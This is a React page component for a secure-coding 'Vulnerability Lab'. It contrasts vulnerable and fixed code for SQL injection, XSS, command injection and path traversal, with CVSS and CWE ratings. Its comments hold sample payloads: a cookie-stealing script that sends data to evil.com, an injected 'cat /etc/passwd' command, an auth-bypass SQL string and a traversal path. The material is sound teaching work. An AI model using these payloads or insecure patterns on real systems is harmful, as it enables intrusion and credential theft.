'use client';

type VulnDef = {
  id: string;
  title: string;
  cwe: string;
  cvss: string;
  cvssScore: number;
  dread: string;
  description: string;
  vulnerableCode: string;
  secureCode: string;
  explanation: string;
};

const VULNS: VulnDef[] = [
  {
    id: 'sqli',
    title: 'SQL Injection',
    cwe: 'CWE-89',
    cvss: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
    cvssScore: 10.0,
    dread: '8.8 / 10',
    description: 'User input is concatenated directly into a SQL query, allowing attackers to manipulate the query logic.',
    vulnerableCode: `// ❌ INSECURE — String interpolation
const query = \`SELECT * FROM users 
  WHERE username = '\${username}' 
  AND password = '\${password}'\`;
const user = await db.get(query);

// Attack payload: username = ' OR '1'='1' --
// Resulting query:
// SELECT * FROM users WHERE username = ''
//   OR '1'='1' --' AND password = ''
// → Returns ALL users, bypasses auth!`,
    secureCode: `// ✅ SECURE — Parameterized query
const user = await db.get(
  'SELECT * FROM users WHERE username = ? AND password = ?',
  [username, password]
);

// Attack payload: username = ' OR '1'='1' --
// Driver sends: username = "' OR '1'='1' --" (literal string)
// → No rows returned. Login fails. ✓`,
    explanation: 'Parameterized queries (prepared statements) separate SQL code from data. The database driver treats user input as a literal string value, never as SQL syntax — making injection impossible regardless of what the attacker sends.',
  },
  {
    id: 'xss',
    title: 'Cross-Site Scripting (XSS)',
    cwe: 'CWE-79',
    cvss: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N',
    cvssScore: 8.2,
    dread: '8.2 / 10',
    description: 'Unescaped user input rendered into HTML lets attackers inject scripts that run in victims\' browsers.',
    vulnerableCode: `// ❌ INSECURE — Directly injecting user HTML
// React equivalent: dangerouslySetInnerHTML
function Comment({ text }) {
  return <div dangerouslySetInnerHTML={{ __html: text }} />;
}

// Attack payload: text = <script>
//   document.location='https://evil.com/steal?c='
//   +document.cookie
// </script>
// → Steals session cookies from every visitor!`,
    secureCode: `// ✅ SECURE — React auto-escaping (default)
function Comment({ text }) {
  return <div>{text}</div>;
  // React escapes: <script>... → &lt;script&gt;...
}

// ✅ OR: sanitize before storing (Defense in Depth)
import { sanitizeHtml } from '@/lib/threat-detector';
const safe = sanitizeHtml(userInput);
// <script> → &lt;script&gt; (displayed as text, not run)`,
    explanation: 'React\'s JSX auto-escapes any string rendered as children. Never use dangerouslySetInnerHTML with user content. For rich content, use a whitelist-based sanitizer library. Our threat detector also blocks XSS payloads at the WAF layer before they reach storage.',
  },
  {
    id: 'cmdi',
    title: 'OS Command Injection',
    cwe: 'CWE-78',
    cvss: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
    cvssScore: 9.8,
    dread: '8.6 / 10',
    description: 'User input passed to a shell command lets attackers execute arbitrary OS commands with server privileges.',
    vulnerableCode: `// ❌ INSECURE — Shell injection via exec
import { exec } from 'child_process';

app.post('/ping', (req, res) => {
  const { host } = req.body;
  exec(\`ping -c 1 \${host}\`, (err, stdout) => {
    res.send(stdout);
  });
});

// Attack payload: host = "8.8.8.8; cat /etc/passwd"
// Executes: ping -c 1 8.8.8.8; cat /etc/passwd
// → Full /etc/passwd read. Next: rm -rf / ?`,
    secureCode: `// ✅ SECURE — Argument array (no shell)
import { execFile } from 'child_process';
import { detectThreat } from '@/lib/threat-detector';

app.post('/ping', (req, res) => {
  const { host } = req.body;
  
  // Layer 1: Threat detection
  if (detectThreat(host).detected) {
    return res.status(400).json({ error: 'Blocked' });
  }
  
  // Layer 2: Whitelist-only commands, no shell
  execFile('ping', ['-c', '1', host], (err, stdout) => {
    res.send(stdout);
  });
  // execFile never invokes a shell → ; has no meaning
});`,
    explanation: 'execFile() (and child_process.spawn) bypass the shell entirely — each argument is passed directly to the OS. The shell metacharacters ; | & $ have no special meaning without a shell. Our threat detector also blocks command injection signatures at Layer 1 before any execution.',
  },
  {
    id: 'path',
    title: 'Path Traversal',
    cwe: 'CWE-22',
    cvss: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
    cvssScore: 7.5,
    dread: '7.4 / 10',
    description: '../ sequences in file paths allow reading arbitrary files outside the intended directory.',
    vulnerableCode: `// ❌ INSECURE — Direct path join with user input
import fs from 'fs';
import path from 'path';

app.get('/file', (req, res) => {
  const filename = req.query.name;
  const filePath = path.join('/var/www/uploads', filename);
  res.send(fs.readFileSync(filePath));
});

// Attack: /file?name=../../etc/passwd
// path.join resolves to: /etc/passwd
// → Server reads and sends /etc/passwd!`,
    secureCode: `// ✅ SECURE — Canonicalize + boundary check
import fs from 'fs';
import path from 'path';
import { detectThreat } from '@/lib/threat-detector';

const UPLOAD_DIR = '/var/www/uploads';

app.get('/file', (req, res) => {
  const filename = req.query.name as string;
  
  // Layer 1: Threat detection ('../' patterns etc.)
  if (detectThreat(filename).detected) {
    return res.status(400).json({ error: 'Blocked' });
  }
  
  // Layer 2: Canonicalize and verify boundary
  const resolved = path.resolve(UPLOAD_DIR, filename);
  if (!resolved.startsWith(UPLOAD_DIR + path.sep)) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  res.send(fs.readFileSync(resolved));
});`,
    explanation: 'path.resolve() collapses all ../ sequences, giving the absolute canonical path. We then check that the resolved path still starts with the allowed directory prefix. Our WAF also patterns-matches ../ sequences and their URL-encoded variants before any filesystem access.',
  },
];

const CVSS_COLOR = (score: number) =>
  score >= 9 ? '#dc2626' : score >= 7 ? '#f97316' : score >= 4 ? '#eab308' : '#22c55e';

export default function VulnLabPage() {
  return (
    <div style={{ maxWidth: '1100px', margin: '0 auto', padding: '2rem 0' }}>
      <style>{`
        .code-block { font-family: 'Cascadia Code', 'Fira Code', monospace; font-size: 0.75rem; line-height: 1.7; white-space: pre; overflow-x: auto; }
        .vuln-code { background: rgba(220,38,38,0.06); border-left: 3px solid #dc2626; padding: 1.25rem; border-radius: 0 6px 6px 0; }
        .secure-code { background: rgba(22,163,74,0.06); border-left: 3px solid #16a34a; padding: 1.25rem; border-radius: 0 6px 6px 0; }
      `}</style>

      {/* Header */}
      <div style={{ borderBottom: '2px solid #1b3a5c', paddingBottom: '1.25rem', marginBottom: '2rem' }}>
        <h1 style={{ fontSize: '1.75rem', fontWeight: 900, color: '#1b3a5c', fontFamily: 'Merriweather, Georgia, serif', margin: '0 0 0.25rem' }}>
          🔬 Vulnerability Lab
        </h1>
        <p style={{ color: '#6b7280', fontSize: '0.875rem', margin: 0 }}>
          Side-by-side: vulnerable vs. secure code for the 4 core attack classes. CVSS 3.1 · CWE · DREAD scores.
        </p>
      </div>

      {VULNS.map(vuln => (
        <div key={vuln.id} style={{ background: 'white', border: '1px solid #e5e7eb', borderRadius: '10px', overflow: 'hidden', marginBottom: '2rem', boxShadow: '0 1px 4px rgba(0,0,0,0.04)' }}>
          {/* Title row */}
          <div style={{ background: '#f9fafb', borderBottom: '1px solid #e5e7eb', padding: '1rem 1.5rem', display: 'flex', alignItems: 'center', flexWrap: 'wrap', gap: '0.75rem' }}>
            <h2 style={{ fontSize: '1rem', fontWeight: 800, color: '#1b3a5c', margin: 0, fontFamily: 'Merriweather, Georgia, serif' }}>
              {vuln.title}
            </h2>
            {/* CWE badge */}
            <span style={{ background: '#e0e7ff', color: '#3730a3', fontSize: '0.65rem', fontWeight: 700, padding: '3px 10px', borderRadius: '4px', letterSpacing: '0.08em' }}>
              {vuln.cwe}
            </span>
            {/* CVSS score */}
            <span style={{
              background: CVSS_COLOR(vuln.cvssScore), color: 'white',
              fontSize: '0.65rem', fontWeight: 800, padding: '3px 10px', borderRadius: '4px', letterSpacing: '0.08em',
            }}>
              CVSS {vuln.cvssScore.toFixed(1)}
            </span>
            {/* DREAD */}
            <span style={{ background: '#fef3c7', color: '#92400e', fontSize: '0.65rem', fontWeight: 700, padding: '3px 10px', borderRadius: '4px', letterSpacing: '0.08em' }}>
              DREAD {vuln.dread}
            </span>
            <p style={{ color: '#6b7280', fontSize: '0.8rem', margin: '0 0 0 auto', maxWidth: '400px', lineHeight: 1.5 }}>
              {vuln.description}
            </p>
          </div>

          {/* Code panels */}
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 0 }}>
            {/* Vulnerable */}
            <div style={{ padding: '1.25rem', borderRight: '1px solid #e5e7eb' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '0.75rem' }}>
                <span style={{ width: '10px', height: '10px', background: '#dc2626', borderRadius: '50%' }} />
                <span style={{ fontSize: '0.7rem', fontWeight: 700, color: '#dc2626', letterSpacing: '0.1em', textTransform: 'uppercase' }}>Vulnerable Code</span>
              </div>
              <div className="code-block vuln-code" style={{ color: '#374151' }}>
                {vuln.vulnerableCode}
              </div>
            </div>
            {/* Secure */}
            <div style={{ padding: '1.25rem' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '0.75rem' }}>
                <span style={{ width: '10px', height: '10px', background: '#16a34a', borderRadius: '50%' }} />
                <span style={{ fontSize: '0.7rem', fontWeight: 700, color: '#16a34a', letterSpacing: '0.1em', textTransform: 'uppercase' }}>Secure Code</span>
              </div>
              <div className="code-block secure-code" style={{ color: '#374151' }}>
                {vuln.secureCode}
              </div>
            </div>
          </div>

          {/* Explanation */}
          <div style={{ padding: '1rem 1.5rem', background: '#f0f9ff', borderTop: '1px solid #e0f2fe' }}>
            <span style={{ fontSize: '0.65rem', fontWeight: 700, color: '#0369a1', letterSpacing: '0.1em', textTransform: 'uppercase' }}>💡 Why it works: </span>
            <span style={{ fontSize: '0.8rem', color: '#374151', lineHeight: 1.6 }}>{vuln.explanation}</span>
          </div>
        </div>
      ))}
    </div>
  );
}
